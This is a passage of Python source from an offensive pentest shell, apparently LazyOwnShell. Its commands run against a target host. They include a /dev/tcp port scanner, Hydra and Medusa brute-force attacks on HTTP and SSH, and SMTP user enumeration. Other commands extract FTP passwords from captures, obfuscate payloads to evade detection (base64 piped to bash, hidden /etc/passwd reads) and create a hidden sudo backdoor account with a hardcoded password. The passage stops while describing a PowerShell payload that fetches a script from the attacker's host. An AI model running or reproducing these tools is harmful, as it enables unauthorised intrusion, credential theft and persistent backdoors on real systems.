        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that 
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the 
        user.
        - `copy2clip()` is used to copy the command to the clipboard if 
        not executed.

        Example:
        >>> do_portdiscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}" 
        echo "Escaneo de puertos abiertos en curso..."
        echo " "

        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && echo "Puerto $port abierto"
        done
        """.replace('        ','').replace('{rhost}',rhost)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            os.system(command)
        else:
            copy2clip(command)
        return

    def do_portservicediscover(self, line):
        """
        Scan all ports on a specified host to identify open ports and associated services.

        This method constructs and executes a bash script that performs a 
        port scan on the specified host to determine which ports are open 
        and identifies any services running on those open ports. It scans 
        all ports from 0 to 65535.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address 
        and report open ports along with any associated services.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the 
        generated command.
        - If the user confirms, executes the command using `os.system()`.
        - If the user declines, copies the command to the clipboard using 
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - Requires `sudo` privileges to use `lsof` for identifying services.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that 
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the 
        user.
        - `copy2clip()` is used to copy the command to the clipboard if 
        not executed.

        Example:
        >>> do_portservicediscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        command = """        #!/bin/bash
        ip="{rhost}" 
        echo "Escaneo de puertos y servicios abiertos en curso..."
        echo " "

        # Realiza un bucle a través de todos los puertos y verifica si están abiertos
        for port in $(seq 0 65535); do
            (echo >/dev/tcp/$ip/$port) >/dev/null 2>&1 && {
                service=$(echo "$(sudo lsof -i :$port)" | awk 'NR==2{print $1}')
                [ -n "$service" ] && echo "Puerto $port abierto - Servicio: $service"
            }
        done
        """.replace('        ','').replace('{rhost}',rhost)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            os.system(command)
        else:
            copy2clip(command)
        return

    def do_rot(self, line):
        """
        Apply a ROT (rotation) substitution cipher to the given string.

        This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 

        Usage:
            rot <number> '<string>'

        :param line: The input string containing the number and the text to be rotated. The format should be '<number> '<string>' where <number> is the rotation amount and <string> is the text to be ciphered.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a number (rotation amount) and a string in the format `rot <number> '<string>'`. Ensure the number is between 1 and 27.

        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
        """

        # Split the line into parts
        parts = line.split("'", 1)
        if len(parts) != 2:
            print_error("Usage: rot <number> '<string>'")
            return

        # Extract the number and text
        number_str = parts[0].strip()
        text = parts[1].strip().strip("'")

        # Validate the number
        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return

        # Apply the rotation
        rotated_text = "".join(rotate_char(c, number) for c in text)
        print_msg(rotated_text)
        copy2clip(rotated_text)
        return

    def do_hydra(self, line):
        """Uses Hydra to perform a brute force attack on a specified HTTP service with a user and password list.

        1. Checks if a wordlist is provided; if not, prints an error message.
        2. Validates the remote host parameter.
        3. Checks if the `line` argument is provided, which should include the path to crack and the port.
        4. If the `line` argument is valid, splits it into arguments for the path and port.
        5. Asks the user if they want to use a small dictionary from a JSON file.
        6. Constructs and prints the Hydra command with the provided parameters.
        7. Executes the Hydra command using `os.system`.

        :param line: The path to crack and port for the Hydra command, formatted as 'path port'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, you would:
        - Provide the path to crack and the port as arguments to this function in the format 'path port'.
        - Ensure that the user list and wordlist are set correctly.
        - hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 http-get /v2/
        Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.
        """

        rhost = self.params.get("rhost")
        wordlist = self.params.get("wordlist")
        
        if not wordlist:
            print_error(
                "You need to load the wordlist using p or payload or set wordlist /path/to/wordlist"
            )
            return

        if not check_rhost(rhost):
            return

        if not line:
            print_error(
                "You need to pass the path to crack and the port, e.g., hydra /login/ 8080"
            )
            return

        args = line.split(" ")

        if len(args) < 2:
            print_error(
                "You need to pass the path to crack and the port, e.g., hydra /login/ 8080"
            )
            return

        use_small_dict = input("Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)
            
            # Create temporary files for users and passwords
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')

            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')

            # Hydra command using the small dictionary
            command = f"hydra -f -L sessions/small_users.txt -P sessions/small_passwords.txt {rhost} -s {args[1]} http-get {args[0]}"
        else:
            # Hydra command using the default wordlist
            command = f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}"

        print_msg(f"Try... {command}")
        os.system(command)
        return

    def do_medusa(self, line):
        """Uses medusa to perform a brute force attack on a specified ssh service with a user and password list.

        1. Checks if a wordlist is provided; if not, prints an error message.
        2. Validates the remote host parameter.
        3. Asks the user if they want to use a small dictionary from a JSON file.
        4. Constructs and prints the medusa command with the provided parameters.
        5. Executes the medusa command using `os.system`.
       
        :param line: The port if is't default port.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, you would:
        - Provide the path to crack and the port as arguments to this function in the format 'path port'.
        - Ensure that the user list and wordlist are set correctly.
        - medusa -h 10.10.10.10 -U sessions/users.txt -P /usr/share/wordlists/rockyou.txt -e ns -M ssh"
        Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.
        """

        rhost = self.params.get("rhost")
        wordlist = self.params.get("wordlist")
        option = ""

        if not wordlist:
            print_error(
                "You need to load the wordlist using p or payload or set wordlist /path/to/wordlist"
            )
            return

        if not check_rhost(rhost):
            return
        if line:
            option = f"-n {line}"
        
        use_small_dict = input("Do you want to use the small dictionary? (yes/no): ").strip().lower()

        if use_small_dict == "yes":
            path = os.getcwd()
            smalldic = f"{path}/modules/credentials.json"
            with open(smalldic, 'r') as f:
                data = json.load(f)
            
            # Create temporary files for users and passwords
            with open('sessions/small_users.txt', 'w') as f:
                for username in data["usernames"]:
                    if username:
                        f.write(username + '\n')

            with open('sessions/small_passwords.txt', 'w') as f:
                for password in data["passwords"]:
                    if password:
                        f.write(password + '\n')

            # medusa command using the small dictionary
            command = f"medusa -h {rhost} -U sessions/small_users.txt -P sessions/small_passwords.txt {option} -e ns -M ssh"
        else:
            # medusa command using the default wordlist
            command = f"medusa -h {rhost} -U sessions/users.txt -P {wordlist} {option} -e ns -M ssh"

        print_msg(f"Try... {command}")
        os.system(command)
        return

    def do_nmapscript(self, line):
        """Perform an Nmap scan using a specified script and port.

        :param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".

        :returns: None

        Manual execution:
        To manually run an Nmap scan with a script and port, use the following command format:

            nmap --script <script> -p <port> <target> -oN <output-file>

        Example:
        If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:

            nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10

        Ensure you have the target host (`rhost`) set in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        parts = line.split(" ", 2)
        if len(parts) != 2:
            print_error("Usage: nmapscript <script> <port>")
            return
        script = parts[0]    
        port = parts[1]
        print_msg(
            f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}"
        )
        os.system(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
        return

    def do_encoderpayload(self, line):
        """
        Applies various obfuscations to a given command line string to create multiple obfuscated versions.

        1. Defines a helper function `double_base64_encode(cmd)` that performs double Base64 encoding on a given command.
        2. Defines the `apply_obfuscations(cmd)` function to create a list of obfuscated commands using different techniques.
        3. Applies these obfuscations to the provided `line` argument and prints each obfuscated command.

        :param line: The command line string to be obfuscated.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would:
        - Provide the command you want to obfuscate as the argument to this function.
        - The function will generate various obfuscated versions of the command and print them.

        Note: Ensure that the command is properly formatted and valid to avoid errors during obfuscation. The obfuscations may involve different encoding and string manipulation techniques.
        """

        try:
            def double_base64_encode(cmd):
                """
                Perform double Base64 encoding on the given command.

                This helper function takes a command string, encodes it in Base64, and then performs
                another Base64 encoding on the result. The final encoded string is returned.

                Args:
                    cmd (str): The command string to be encoded.

                Returns:
                    str: The double Base64 encoded string.

                Example:
                    >>> double_base64_encode("example")
                    'ZWN4YW5hbWVsZQ=='

                Notes:
                    - The function first encodes the command string into bytes using UTF-8 encoding.
                    - It then applies Base64 encoding twice and removes any leading or trailing whitespace.
                    - The result is decoded back to a string and returned.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """

                return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()
            
            def apply_obfuscations(cmd):
                """
                Generate a list of obfuscated commands based on the given input command.

                This function creates various obfuscated versions of the provided command string.
                Each obfuscation method applies a different technique to disguise the command, 
                making it less recognizable to simple static analysis.

                Args:
                    cmd (str): The command string to be obfuscated.

                Returns:
                    list of str: A list of obfuscated command strings.

                Example:
                    >>> apply_obfuscations("cat /etc/passwd")
                    [
                        'echo "echo $(echo \'cat /etc/passwd\' | base64 | base64)|base64 -d|base64 -d|bash" | sed \'s/ /${IFS}/g\'',
                        'echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash',
                        '$(tr \'\[A-Z\]\' \'\[a-z\]\' <<< \'cat /etc/passwd\')',
                        ...
                    ]

                Notes:
                    - Each obfuscation method aims to transform the command in a unique way.
                    - Obfuscations include encoding, character replacement, and command substitution techniques.
                    - Ensure that the `double_base64_encode` function is defined and available in the scope where this function is used.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """                
                obfuscations = [
                    f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
                    f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
                    f"$(tr '[A-Z]' '[a-z]' <<< '{cmd}')",
                    f"$(a='{cmd}'; printf %s \"${{a,,}}\")",
                    f"$(rev <<< '{cmd}')",
                    f"bash <<< $(base64 -d <<< {base64.b64encode(cmd.encode()).decode()})",
                    f"echo {cmd} | $0",
                    f"cat$u /etc$u/passwd$u",
                    f"p${{u}}i${{u}}n${{u}}g",
                    f"p\\\i\\\n\\\g",
                    f"cat ${{HOME:0:1}}etc${{HOME:0:1}}passwd",
                    f"cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
                    f"echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
                    f"cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
                    f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
                    f"$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
                    f"while read -r line; do echo $line; done < /etc/passwd"
                ]
                return obfuscations

            obfuscations = apply_obfuscations(line)
            for obfuscation in obfuscations:
                print_msg(obfuscation)
                copy2clip(obfuscation)
        
        except Exception as e:
            print_error(f"An error occurred: {e}")

    def do_smtpuserenum(self, line):
        """
        Enumerates SMTP users using the `smtp-user-enum` tool with the VRFY method.

        1. Checks if the `rhost` (remote host) parameter is set:
        - If not set, displays an error message and exits the function.

        2. Checks if the `usrwordlist` (user wordlist) parameter is provided:
        - If not provided, displays an error message indicating that the `p` or `payload` parameter should be used to load payloads.

        3. If both parameters are provided:
        - Displays the command that will be executed for user enumeration.
        - Runs `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>` to perform user enumeration.

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that the `rhost` parameter is set with the target IP address using `set rhost <IP>`.
        - Load the user wordlist using the `set usrwordlist <path>` command.
        - Execute the command `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>`.
        - Ex: sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10
        Note: Ensure that you have the necessary permissions to run `smtp-user-enum` with `sudo` and that the wordlist file exists at the specified path.
        """

        rhost = self.params["rhost"]
        usrwordlist = self.params["usrwordlist"]
        if not check_rhost(rhost):
            return
        if not usrwordlist:
            print_error("use p or payload to load payloads parameters")
            return
        print_msg(f"Try... sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        os.system(f"sudo smtp-user-enum -M VRFY -U {usrwordlist} -t {rhost}")
        return

    def do_sshd(self, line):
        """
        Starts the SSH service and displays its status.

        1. Executes the command to start the SSH service:
        - Runs `sudo systemctl start ssh` to initiate the SSH service.

        2. Displays the status of the SSH service:
        - Runs `sudo systemctl status ssh` to show the current status of the SSH service.

        :param line: Not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Execute `sudo systemctl start ssh` to start the SSH service.
        - Run `sudo systemctl status ssh` to check the status of the SSH service.

        Note: Ensure that you have the necessary permissions to start services using `sudo` and that the SSH service is installed on your system.
        """
        print_msg(f"Try... sudo systemctl start ssh")
        os.system(f"sudo systemctl start ssh")
        os.system(f"sudo systemctl status ssh")
        return

    def do_nmapscripthelp(self, line):
        """
        Provides help to find and display information about Nmap scripts.

        1. Checks if an argument is provided:
        - If no argument is given, displays an error message indicating the need to pass a script name.

        2. Executes a command to display script help:
        - Runs `nmap --script-help` with the provided argument (appending a wildcard `*` to match script names).
        - Prints a message with the command being executed and provides further instructions for using the Nmap script.

        3. Prints a message suggesting the next step:
        - Provides a suggestion for running Nmap with the appropriate script and options based on the search results.

        :param line: The script or keyword to search for in the Nmap script help output.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Run `nmap --script-help` with the specific script name or keyword.
        - Use the script names in Nmap commands to run scans with the desired scripts.

        Note: Ensure that `nmap` is installed and accessible in the system's PATH.
        """

        if not line:
            print_error("you must pass the script to find by argument.")
            return

        print_msg(f"Try... nmap --script-help '{line}*'{RESET}")
        os.system(f"nmap --script-help '{line}*'")
        print_msg(
            f"now you can run : {MAGENTA} sh sudo nmap -sCV -p <port> --script <script1,script2 <ip> {RESET}"
        )
        return

    def do_apropos(self, line):
        """
        Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.

        :param line: The search term to find matching commands.

        :returns: None

        Manual execution:
        To manually search for commands matching a term using the `apropos` command, use the following command:

            apropos <search_term>

        Example:
            apropos network

        The `apropos` command will search for commands and documentation that match the given search term.

        The function also searches within the available commands in the cmd interface.
        """
        # Search within the cmd commands
        matched_cmds = [cmd for cmd in self.get_names() if line in cmd]

        if matched_cmds:
            print_msg("Commands found in the cmd interface:")
            for cmd in matched_cmds:
                print_msg(f"  {cmd.replace('do_','').replace('run_', 'run ')}")
        else:
            print_warn("No matching commands found in the cmd interface.")

        # Ask if the user wants to extend the search using the system's apropos command
        extend_search = input(
            f"    {YELLOW}[?] {WHITE}Do you want to extend the search using the system's {GREEN}`apropos`{WHITE} command? {MAGENTA}(y/n): {RESET}"
        )

        if extend_search.lower() == "y":
            print_msg(f"Searching for '{line}' using `apropos`...")
            os.system(f"apropos {line}")
        return

    def do_searchhash(self, line):
        """
        Helps to find hash types in Hashcat by searching through its help output.

        1. Checks if an argument is provided:
        - If no argument is given, displays an error message indicating the need to pass a hash type.

        2. Executes a command to search for hash types:
        - Runs `hashcat -h` to display Hashcat help information and pipes it to `grep` to search for the provided argument.
        - Prints a message with the command being executed and provides further instructions for running Hashcat.

        3. Prints a message suggesting the next step:
        - Provides a suggestion for running Hashcat with the found hash types.

        :param line: The hash type or keyword to search for in the Hashcat help output.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Run `hashcat -h` to display the help information.
        - Use `grep` to search for the specific hash type or keyword within the help output.
        - Run Hashcat with the appropriate parameters based on the search results.

        Note: Ensure that `hashcat` is installed and accessible in the system's PATH.
        """
        if not line:
            print_error("you must pass the hash type to find by argument.")
            return

        print_msg(f"Try... hashcat -h | grep -i {line}{RESET}")
        os.system(f"hashcat -h | grep -i {line}")
        print_msg(f"now you can run : {MAGENTA} hashcat NNN sessions/hash.txt {RESET}")
        return

    def do_clean(self, line):
        """
        Deletes files and directories in the `sessions` directory, excluding specified files and directories.

        1. Checks if the `rhost` parameter is valid:
        - Uses the `check_rhost` function to verify if `rhost` is set and valid.
        - If `rhost` is not valid, exits the function.

        2. Lists files and directories in the `sessions` directory:
        - Uses `os.listdir` to list all files and directories in the `sessions` directory.
        - Compares each item with the list of exclusions.

        3. Deletes files and directories not in the exclusion list:
        - Uses `os.remove` to delete files and `shutil.rmtree` to delete directories.

        4. Prints a message indicating that the cleanup is complete.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that you have the correct `rhost` value set.
        - Manually execute commands to delete files and directories, excluding specified ones.

        Note: This function performs a cleanup by removing various files and directories associated with the current session, excluding specified items.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        exclusions = [
            'download_resources.sh',
            'win',
            'lin',
            'php',
            'users.txt',
            'sslscan-singleip.sh'
        ]

        # Path to the sessions directory
        sessions_dir = 'sessions'

        # List all files and directories in the sessions directory
        all_items = os.listdir(sessions_dir)

        for item in all_items:
            item_path = os.path.join(sessions_dir, item)
            if not any(item == exclusion or item.startswith(exclusion) for exclusion in exclusions):
                try:
                    if os.path.isfile(item_path):
                        print_msg(f"Deleting file ... {item_path}")
                        os.remove(item_path)
                    elif os.path.isdir(item_path):
                        print_msg(f"Deleting dir ... {item_path}")
                        os.system(f"rm -rf {item_path}")
                except Exception as e:
                    print_error(f"Failed to delete {item_path}: {e}")

        print_msg(f"Cleaned sessions directory. {RESET}")
        return

    def do_pyautomate(self, line):
        """
        Automates the execution of pwntomate tools on XML configuration files.

        1. Sets the directory for XML files to be processed:
        - Checks the `sessions` directory for XML files.

        2. For each XML file found:
        - Constructs and executes a command to run `pwntomate` with the XML file as input.
        - The command is executed using `subprocess.run`, and errors are handled if the command fails.

        3. After processing all XML files:
        - Prints a message indicating that the target has been pwntomated.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that XML configuration files are present in the `sessions` directory.
        - Run `pwntomate.py` manually on each XML file using a similar command format.

        Note: This function assumes that `pwntomate.py` is available in the current working directory and is executable with Python 3.
        """
        directory = "sessions"
        # Obtener la lista de archivos en el directorio
        files = os.listdir(directory)

        # Filtrar solo los archivos .xml
        xml_files = [file for file in files if file.endswith(".xml")]
        path = os.getcwd()
        # Para cada archivo XML, ejecutar el comando
        for xml_file in xml_files:
            xml_path = os.path.join(directory, xml_file)
            command = f"python3 pwntomate.py {xml_path} -x -b {path}/sessions"
            print_msg(f"Executing command: {MAGENTA}{command}{RESET}")
            try:
                subprocess.run(command, shell=True, check=True)
            except subprocess.CalledProcessError as e:
                print_error(f"Error executing command for {xml_file}: {e}{RESET}")
        print_msg(f"{YELLOW}Target was pwntomated 🍅. {RESET}")
        return

    def do_alias(self, line):
        """
        Prints all configured aliases and their associated commands.

        1. Retrieves the list of aliases from the `LazyOwnShell` instance:
        - Iterates through each alias and its associated command.

        2. For each alias:
        - Displays the alias name and the full command it represents.

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure that aliases are configured in the `LazyOwnShell` instance.
        - Manually review the aliases and their commands as displayed.

        Note: This function assumes that aliases are managed by the `LazyOwnShell` instance and are available for retrieval.
        """

        aliases = LazyOwnShell().aliases
        for alias, command in aliases.items():
            print_msg(
                f"{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} "
            )
        return

    def do_tcpdump_icmp(self, line):
        """
        Starts `tcpdump` to capture ICMP traffic on the specified interface.

        1. Checks if the `line` argument (interface) is provided:
        - Displays an error message and exits if the interface is missing.

        2. If the interface is provided:
        - Displays the `tcpdump` command that will be executed.
        - Runs the `tcpdump` command to capture ICMP traffic on the specified interface.

        :param line: The network interface on which to capture ICMP traffic (e.g., `tun0`).
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Provide a valid network interface for capturing ICMP traffic.
        - Execute the `tcpdump` command manually to capture ICMP traffic on the specified interface.

        Note: Ensure that you have sufficient permissions to run `tcpdump` on the specified interface.
        """

        if not line:
            print_error(
                "necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0"
            )
            return
        print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} icmp -n{RESET} ")
        os.system(f"sudo tcpdump -i {line} icmp -n")
        return

    def do_tcpdump_capture(self, line):
        """
        Starts packet capture using `tcpdump` on the specified interface.

        1. Checks if the `line` argument (interface) is provided:
        - Displays an error message and exits if the interface is missing.

        2. Validates the `rhost` (remote host IP):
        - Exits the function if the `rhost` is not valid.

        3. If the interface and `rhost` are valid:
        - Displays the `tcpdump` command that will be executed.
        - Runs the `tcpdump` command to capture packets on the specified interface and save the capture file to `pcaps/capture_<rhost>.pcap`.

        :param line: The network interface on which to capture packets (e.g., `tun0`).
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Provide a valid network interface for capturing packets.
        - Ensure the remote host IP is set correctly.
        - Execute the `tcpdump` command manually to capture packets on the specified interface.

        Note: Ensure that the `pcaps` directory exists and is writable for saving the capture file.
        """

        if not line:
            print_error(
                "necesitas pasarle la interfaz que se quedarà en escucha ej: tcpdump_icmp tun0"
            )
            return
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return

        print_msg(f"{WHITE}sudo tcpdump -i {GREEN}{line}{WHITE}{CYAN} -w pcaps/capture_{rhost}.pcap {RESET} ")
        os.system(f"sudo tcpdump -i {line}  -w pcaps/capture_{rhost}.pcap ")
        return

    def do_tshark_analyze(self, line):
        """
        Analyzes a packet capture file using `tshark` based on the provided remote host IP.

        1. Checks if the `rhost` (remote host IP) is valid:
        - Displays an error message and exits if the `rhost` is not valid.

        2. Verifies the existence of the packet capture file:
        - Displays an error message and exits if the capture file is missing.
        - Prompts the user to run the `do_tcpdump_capture` command first.

        3. If the capture file exists:
        - Displays the `tshark` command that will be executed.
        - Runs the `tshark` command to analyze the packet capture file and print out IP destination and frame time fields.

        :param line: The command line input specifying the interface for capturing packets.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would need to:
        - Ensure the remote host IP is valid.
        - Run the `do_tcpdump_capture` command to capture packets.
        - Execute the `tshark` command manually to analyze the packet capture file.

        Note: Ensure that the capture file `pcaps/capture_<rhost>.pcap` is available in the `pcaps` directory.
        """

        pcaps_dir = 'pcaps'
        all_items = os.listdir(pcaps_dir)

        for item in all_items:
            item_path = os.path.join(pcaps_dir, item)

            try:
                if os.path.isfile(item_path):
                    print_msg("Analizing...")
            
                    rhost = self.params['rhost']
                    if not check_rhost(rhost):
                        return

                    pcap_file = item_path
                    if not os.path.exists(pcap_file):
                        print_error("you must run command do_tcpdump_capture tun0 first.")
                        return
                    if os.path.splitext(pcap_file)[1].lower() == '.pcap':

                        command = f'tshark -r {pcap_file} -T fields -e frame.number -e frame.time -e frame.len -e ip.src -e ip.dst -e ip.proto -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport -e http.request.uri -e http.response.code -e ftp.request.command -e ftp.request.arg -e dns.qry.name '
                        print_msg(command)
                        os.system(command)
                        command = f'tshark -r {pcap_file} -q -z conv,tcp,ip '
                        print_msg(command)
                        os.system(command)
                        command = f"tshark -r {pcap_file} -Y 'ftp.request.command == USER || ftp.request.command == PASS' -T fields -e ip.dst -e frame.time -e ftp.request.command -e ftp.request.arg"
                        print_msg(command)
                        os.system(command)
                    else:
                        print_error("No pcap files found in pcaps directory")

            except Exception as e:
                print_error(f"Failed to delete {item_path}: {e}")

        return

    def do_rdp(self, line):
        """
        Reads credentials from a file, encrypts the password, and executes the RDP connection command.

        1. Reads credentials:
            - Reads the username and password from the `sessions/credentials.txt` file.

        2. Encrypts the password:
            - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.

        3. Executes the RDP connection command:
            - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
        - Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
        Example usage: `rdp`
        """
        path = os.getcwd()
        credentials_file = f'{path}/sessions/credentials.txt'
        
        if not os.path.isfile(credentials_file):
            print_error("Error: Credentials file not found.")
            return
        
        with open(credentials_file, 'r') as file:
            credentials = file.readline().strip()
        
        if not credentials:
            print_error("Error: No credentials found in the file.")
            return
        
        # Split credentials into username and password
        try:
            username, password = credentials.split(':')
        except ValueError:
            print_error("Error: Invalid credentials format in the file.")
            return
        
        rhost = self.params['rhost']
        
        if not check_rhost(rhost):
            print_error("Error: Invalid or undefined rhost.")
            return

        # Construct and execute the remmina command
        remmina_command = f'remmina -c rdp://{username}@{rhost}'
        password = password.replace('\r', '').replace('\n', '').splitlines()[0]
        print_msg(password)
        command = f'printf "{password}" | xclip -sel clip'
        os.system(command)
        
        print_msg(f"Executing command: {remmina_command}")
        try:
            subprocess.run(remmina_command, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Error executing remmina command: {e}")
        return

    def do_base64encode(self, line):
        """
        Encodes a given string into Base64 format.

        1. Encodes the input string:
            - Uses the `base64` library to encode the provided string into Base64 format.

        2. Displays the encoded string:
            - Prints the Base64 encoded string to the terminal.

        :param line: The string to encode in Base64 format.
        :type line: str
        :returns: None

        Manual execution:
        To manually encode a string in Base64:
        - Provide the string to the command and it will print the Base64 encoded result.
        Example usage: `base64encode HelloWorld`
        """
        if line:
            # Encode the input line to Base64
            encoded_bytes = base64.b64encode(line.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            print_msg(encoded_str)
        else:
            print_error("Error: No input provided for encoding.")

    def do_base64decode(self, line):
        """
        Decodes a Base64 encoded string.

        1. Decodes the Base64 string:
            - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.

        2. Displays the decoded string:
            - Prints the decoded string to the terminal.

        :param line: The Base64 encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually decode a Base64 encoded string:
        - Provide the Base64 encoded string to the command and it will print the decoded result.
        Example usage: `base64decode SGVsbG9Xb3JsZA==`
        """
        if line:
            try:
                # Decode the Base64 encoded line
                decoded_bytes = base64.b64decode(line)
                decoded_str = decoded_bytes.decode('utf-8')
                print_msg(decoded_str)
            except Exception as e:
                print_error(f"Error decoding Base64 string: {e}")
        else:
            print_error("Error: No input provided for decoding.")

    def do_grisun0(self, line):
        """
        Creates and copies a shell command to add a new user `grisun0`, set a password, add the user to the sudo group, and switch to the user.

        1. Displays the command:
            - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, set the password, add the user to the `sudo` group, set the appropriate permissions, and switch to the user.

        2. Copies the command to clipboard:
            - Uses `xclip` to copy the command to the clipboard for easy pasting.

        :param line: This function does not use any arguments.
        :type line: str
        :returns: None

        Manual execution:
        To manually execute the command:
        - Copy the command from the clipboard.
        - Run it in a terminal to create the user and set up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
        Note: Ensure `xclip` is installed and available on your system.
        """

        print_msg(f"{WHITE}useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0{RESET} ")
        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
        print_warn("Copied to clip ;)")
        return

    def do_winbase64payload(self, line):
        """
        Creates a base64 encoded PowerShell payload specifically for Windows to execute a `.ps1` script from `lhost`.

        1. Checks if `lhost` is set:
            - Displays an error message and exits if `lhost` is not set.

        2. Checks if a file name is provided:
            - Displays an error message and exits if no file name is provided.

        3. Constructs a PowerShell command:
